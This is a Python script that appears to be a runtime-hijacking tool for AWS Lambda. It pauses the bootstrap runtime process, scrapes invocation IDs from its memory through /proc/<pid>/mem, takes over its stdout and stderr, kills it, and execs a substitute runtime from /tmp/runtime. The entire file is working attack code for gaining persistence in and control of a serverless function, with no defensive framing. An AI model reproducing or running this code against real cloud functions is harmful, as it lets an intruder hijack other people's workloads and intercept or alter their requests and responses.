#!/usr/bin/env python3 
import os
import re
import sys

DEFAULT_RUNTIME_PATH = "/tmp/runtime"
INVOKE_REGEX = b'([0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12})'
INVOKE_MIN_LEN = 36

DEFAULT_MAX_MEM =  128 * 1024 * 1024  # 128MB, the min lambda memory limit
if "AWS_LAMBDA_FUNCTION_MEMORY_SIZE" in os.environ:
    lambda_limit = int(os.environ["AWS_LAMBDA_FUNCTION_MEMORY_SIZE"]) / 10
    lambda_limit = lambda_limit * 1024 * 1024  # to MB
else:
    lambda_limit = DEFAULT_MAX_MEM
MAX_MEM = int(0.8 * lambda_limit) # 80% of memory limit

STDOUT_FILENO = 1
STDERR_FILENO = 2

def main():
    old_runtime_pid = os.popen("pgrep -fn 'python.*bootstrap'").read()
    if (not old_runtime_pid) or (not old_runtime_pid.rstrip().isdigit()):
        # Maybe we already switched it, let's try to switch again
        print("[!] Couldn't find the bootstrap process, checking if we already switched it...")
        old_runtime_pid = os.popen("pgrep -fn '{}'".format(DEFAULT_RUNTIME_PATH)).read() 
        if (not old_runtime_pid) or (not old_runtime_pid.rstrip().isdigit()):
            print("[!] Couldn't find the bootstrap process or our new runtime, " + \
                  "maybe someone else already switched the runtime? (or AWS changed the architecture)")
            return

    old_runtime_pid = old_runtime_pid.rstrip()
    signal_process("STOP", old_runtime_pid)  # stop the bootstrap process

    possible_invoke_ids = extract_invoke_id(old_runtime_pid)
    if len(possible_invoke_ids) == 0:
        print("[!] Failed to extract invoke id")
        signal_process("CONT", old_runtime_pid)  # aborting, let the bootstrap process continue
        return

    copy_stdout_stderr(old_runtime_pid)   
    signal_process("kill", old_runtime_pid)  # kill the bootstrap process

    new_runtime_path = DEFAULT_RUNTIME_PATH
    os.chmod(new_runtime_path, 0o777)
    args = [new_runtime_path] + possible_invoke_ids
    os.execv(new_runtime_path, args) 

    
# Sends a signal to a process
def signal_process(signal, pid):
    cmd = "kill -{} {}".format(signal, pid)
    os.popen(cmd).read()

# Extracts possible invoke ids from a process's memory
def extract_invoke_id(pid):
    matches = []

    # access process memory
    maps_file = open("/proc/{}/maps".format(pid), 'r')
    mem_file = open("/proc/{}/mem".format(pid), 'rb', 0)

    maps = maps_file.readlines()
    for map_line in maps:
        # We need looking for a dynamic value, should reside in a read write memory region
        m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) rw', map_line)
        if m == None:
            continue
            
        mem_start = int(m.group(1), 16)
        mem_end = int(m.group(2), 16) 
        mem_len = mem_end - mem_start
        if mem_len > MAX_MEM:  # don't try to read a memory chunk that is to big for our Lambda max memory
            continue
            
        try:
            mem_file.seek(mem_start)  # seek to region start
            mem_chunk = mem_file.read(mem_len)  # read region contents
        except (OSError ,IOError, OverflowError):
            continue
        matches += parse_matches_from_chunk(mem_chunk)  

    return list(set(matches))


# Search for invoke ids in the current memory chunk
def parse_matches_from_chunk(chunk):
    if len(chunk) < INVOKE_MIN_LEN:
        return []  # chunk not big enough to contain invoke ids

    matches = []
    for m in re.finditer(INVOKE_REGEX, chunk):
        found_invoke_id = m.group(1)
        matches.append(str(found_invoke_id, "ascii"))

    return matches


# Copy the old runtime stdout and stderr to our process
def copy_stdout_stderr(pid):
    path = "/proc/{}/fd/1".format(pid)
    bootstrap_stdout = os.open(path, os.O_WRONLY)
    os.dup2(bootstrap_stdout, STDOUT_FILENO)
    os.dup2(bootstrap_stdout, STDERR_FILENO)


if __name__ == "__main__":
    main()
